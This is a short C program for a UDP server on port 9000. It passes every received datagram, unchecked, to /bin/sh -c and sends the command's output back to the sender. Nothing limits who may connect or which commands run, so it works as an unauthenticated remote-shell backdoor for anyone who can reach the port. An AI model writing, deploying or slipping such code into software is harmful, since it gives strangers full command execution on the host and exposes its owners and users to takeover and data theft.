#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define PORT 9000
#define BUF_SIZE 1024

int main() {
    int sockfd;
    char buffer[BUF_SIZE];
    struct sockaddr_in server_addr, client_addr;
    socklen_t len = sizeof(client_addr);

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) { perror("socket"); exit(1); }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(PORT);

    if (bind(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("bind");
        exit(1);
    }

    while (1) {
        memset(buffer, 0, BUF_SIZE);
        recvfrom(sockfd, buffer, BUF_SIZE, 0, (struct sockaddr*)&client_addr, &len);

        int pd[2];
        pipe(pd);

        pid_t pid = fork();
        if (pid == 0) {  // Child
            close(pd[0]); // Close read end
            dup2(pd[1], STDOUT_FILENO); // Redirect stdout to pipe
            dup2(pd[1], STDERR_FILENO); // Redirect stderr too (optional)
            close(pd[1]);

            execl("/bin/sh", "sh", "-c", buffer, NULL);
            perror("execl failed");
            exit(1);
        } else {  // Parent
            close(pd[1]); // Close write end
            char outbuf[BUF_SIZE];
            ssize_t n;
            while ((n = read(pd[0], outbuf, BUF_SIZE)) > 0) {
                sendto(sockfd, outbuf, n, 0, (struct sockaddr*)&client_addr, len);
            }
            close(pd[0]);
            waitpid(pid, NULL, 0);
        }
    }

    close(sockfd);
    return 0;
}